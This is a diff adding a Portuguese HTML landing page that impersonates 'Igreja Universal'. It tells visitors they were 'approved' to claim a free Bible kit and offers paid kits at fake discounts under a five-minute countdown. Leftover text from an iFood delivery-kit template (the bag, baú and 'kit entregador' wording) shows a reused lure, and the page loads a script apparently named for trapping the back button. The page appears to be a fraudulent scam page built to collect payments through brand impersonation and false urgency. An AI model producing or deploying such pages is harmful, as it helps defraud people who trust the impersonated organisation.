@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#EA1D2C">
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>Igreja Universal - Resgate do Kit</title>
+    <meta name="description" content="Seu perfil foi selecionado para escolher 1 item do resgate Universal: bag, ba&uacute; ou kit entregador.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=3.4">
+    <script src="/backguard.js?v=1.5"></script>
+</head>
+
+<body data-page="success">
+
+    <header class="header">
+        <div class="logo-container">
+            <h2 style="color: #D4AF37; font-family: 'Outfit', sans-serif; font-weight: 700; font-size: 1.8rem; margin: 0; letter-spacing: 2px;">IGREJA UNIVERSAL</h2>
+        </div>
+    </header>
+
+    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
+
+    <main class="container">
+        <section class="step" aria-hidden="false">
+            <div class="badge-approved">APROVADO</div>
+            <h1>Parab&eacute;ns, <span id="lead-name">parceiro</span>!</h1>
+            <p>Seu perfil foi selecionado. Escolha agora 1 item para resgatar: Kit Bíblico de Estudo, Kit Bíblico Premium ou kit entregador iFood.</p>
+
+            <div class="product-card success-offer-card">
+                <div class="success-offer-grid" role="list" aria-label="Itens dispon&iacute;veis para resgate">
+                    <button class="success-reward-card" type="button" data-reward-id="bag" aria-pressed="false">
+                        <span class="success-reward-media">
+                            <img src="assets/universal_bible_kit.png" alt="Kit Bíblico de Estudo" class="success-reward-image" loading="lazy" decoding="async">
+                        </span>
+                        <span class="success-reward-copy">
+                            <span class="success-reward-title">Kit Bíblico de Estudo</span>
+                            <span class="price-row">
+                                <span class="old-price">R$ 149,90</span>
+                                <span class="new-price">R$ 0,00</span>
+                            </span>
+                        </span>
+                    </button>
+
+                    <button class="success-reward-card" type="button" data-reward-id="bau" aria-pressed="false">
+                        <span class="success-reward-media">
+                            <img src="assets/universal_bible_kit.png" alt="Kit Bíblico Premium" class="success-reward-image" loading="lazy" decoding="async">
+                        </span>
+                        <span class="success-reward-copy">
+                            <span class="success-reward-title">Kit Bíblico Premium</span>
+                            <span class="price-row">
+                                <span class="old-price">R$ 249,90</span>
+                                <span class="new-price">R$ 39,90</span>
+                            </span>
+                        </span>
+                    </button>
+
+                    <button class="success-reward-card" type="button" data-reward-id="kit_entregador" aria-pressed="false">
+                        <span class="success-reward-media">
+                            <img src="assets/universal_bible_kit.png" alt="Super Kit Família Cristã" class="success-reward-image" loading="lazy" decoding="async">
+                        </span>
+                        <span class="success-reward-copy">
+                            <span class="success-reward-title">Super Kit Família Cristã</span>
+                            <span class="price-row">
+                                <span class="old-price">R$ 449,90</span>
+                                <span class="new-price">R$ 97,90</span>
+                            </span>
+                        </span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="scarcity-box">
+                <strong>Aten&ccedil;&atilde;o:</strong> escolha e finalize seu resgate agora antes que este lote promocional encerre.
+                <div style="margin-top: 8px; font-weight: 700; color: #d32f2f;">Expira em: <span id="timer">05:00</span></div>
+            </div>
+
+            <div class="action-stack">
+                <button id="btn-checkout" class="btn-primary" type="button" disabled>Continuar Resgate</button>
+            </div>
+
+            <p class="shipping-note">A bag &eacute; gr&aacute;tis. O ba&uacute; tem adicional de R$ 39,90 e o kit entregador de R$ 97,90.</p>
+        </section>
+    </main>
+
+    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
+
+    <footer class="footer">
+        <p>&copy; 2026 Igreja Universal. Todos os direitos reservados.</p>
+    </footer>
+
+    <script src="script.js?v=9.1" defer></script>
+</body>
+
+</html>
